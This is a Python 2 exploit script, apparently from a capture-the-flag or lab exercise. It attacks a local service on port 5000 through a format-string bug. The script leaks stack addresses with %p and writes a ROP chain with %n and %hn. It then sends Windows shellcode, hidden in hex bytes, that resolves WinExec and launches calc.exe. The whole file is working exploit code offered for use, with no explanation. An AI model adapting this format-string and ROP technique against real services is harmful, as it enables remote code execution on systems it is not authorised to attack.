import socket
import struct
import time


host = "127.0.0.1"
port = 5000

shell = "\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x40\x1c\x8b\x04\x08\x8b\x04\x08\x8b\x58\x08\x8b\x53\x3c\x01\xda\x8b\x52\x78\x01\xda\x8b\x72\x20\x01\xde\x41\xad\x01\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08\x64\x64\x72\x65\x75\xe2\x49\x8b\x72\x24\x01\xde\x66\x8b\x0c\x4e\x8b\x72\x1c\x01\xde\x8b\x14\x8e\x01\xda\x89\xd6\x31\xc9\x51\x68\x45\x78\x65\x63\x68\x41\x57\x69\x6e\x89\xe1\x8d\x49\x01\x51\x53\xff\xd6\x87\xfa\x89\xc7\x31\xc9\x51\x68\x72\x65\x61\x64\x68\x69\x74\x54\x68\x68\x41\x41\x45\x78\x89\xe1\x8d\x49\x02\x51\x53\xff\xd6\x89\xc6\x31\xc9\x51\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe1\x6a\x01\x51\xff\xd7\x31\xc9\x51\xff\xd6"


def fmt(addr_temp, dest, s):
	payload1 = '%p%p%p%p%p%p%p%' 	#11111p%hnBBBB'
	payload2 = 'a%p%p%p%p%p%p%p%'	#11111p%nBBBB'
	print '.'
	if addr_temp < 0x1869f:
		op = str(addr_temp - 57)
		
		if len(op) < 5:
			for i in range(len(op),5):
				op = '0' + op
		payload = payload2 + op + 'p%n' + struct.pack('<I', dest)
		time.sleep(0.5)
		s.send(payload)

	else:
		payload = 'a%p%p%p%p%p%p%p%00001p%n' + struct.pack('<I', dest)
		time.sleep(0.5)
		s.send(payload)
		if addr_temp < 0x1000000:
			op = str(int(hex(addr_temp)[2:6],16) - 56)
			if len(op) < 5:
				for i in range(len(op),5):
					op = '0' + op
			payload = payload1 + op + 'p%hn' + struct.pack('<I', dest + 1)
			time.sleep(0.5)
			s.send(payload)
			op = str(int(hex(addr_temp)[4:8],16) - 56)
			if len(op) < 5:
				for i in range(len(op),5):
					op = '0' + op
			payload = payload1 + op + 'p%hn' + struct.pack('<I', dest)
			time.sleep(0.5)
			s.send(payload)

		else:
			a = hex(addr_temp)
			if len(a) == 9:
				a = '0' + a[2:9]
			else:
				a = a[2:10]
			op = str(int(a[0:4],16) - 56)
			if len(op) < 5:
				for i in range(len(op),5):
					op = '0' + op
			payload = payload1 + op + 'p%hn' + struct.pack('<I', dest + 2)
			time.sleep(0.5)
			s.send(payload)
			op = str(int(a[4:8],16) - 56)
			if len(op) < 5:
				for i in range(len(op),5):
					op = '0' + op
			payload = payload1 + op + 'p%hn' + struct.pack('<I', dest)
			time.sleep(0.5)
			s.send(payload)


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

time.sleep(0.5)
payload = '\x00\x04\x00\x00%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p'
s.send(payload)
time.sleep(0.5)
a = s.recv(1024)

addr_buf = int(a[191:199], 16)
addr_ret = addr_buf + 0x40c
addr_stack = int(a[191:195] + '6000', 16)
addr_4byteFirst =  a[175:179]
edi = int(addr_4byteFirst + 'a000', 16)
esi = int('1070', 16)

payload2 = '%p%p%p%p%p%24p%n' +  struct.pack('<I', addr_ret+48)  
pl_quit = 'QUIT'  + shell

print 'buf = ' + a[191:199]
print '4byteF = ' + a[175:179]
print "Send payload"
	
fmt(0x65701e04, addr_ret, s)					#pop edi, pop esi
fmt(edi, addr_ret+4, s)
fmt(esi, addr_ret+8, s)
fmt(0x65703983, addr_ret+16, s)					#jmp [edi+esi]
fmt(int(addr_4byteFirst + '157b', 16), addr_ret+32, s)					#0x6570346a
fmt(addr_stack, addr_ret+36, s)
fmt(0xa000, addr_ret+40, s)
fmt(0x1000, addr_ret+44, s)
s.send(payload2)
fmt(addr_stack, addr_ret+52, s)		#return sprintf
fmt(addr_stack, addr_ret+56, s)		#return sprintf
fmt(addr_buf+4, addr_ret+60, s)
#fmt(addr_buf+4, addr_ret+52, s)
#fmt(0x65701f8e, addr_ret+56, s)


fmt(addr_stack, addr_ret+80, s)		#return sprintf
fmt(addr_stack, addr_ret+84, s)		#param sprintf
fmt(addr_buf+4, addr_ret+88, s)
time.sleep(0.5)
s.send(pl_quit)


print 'done'
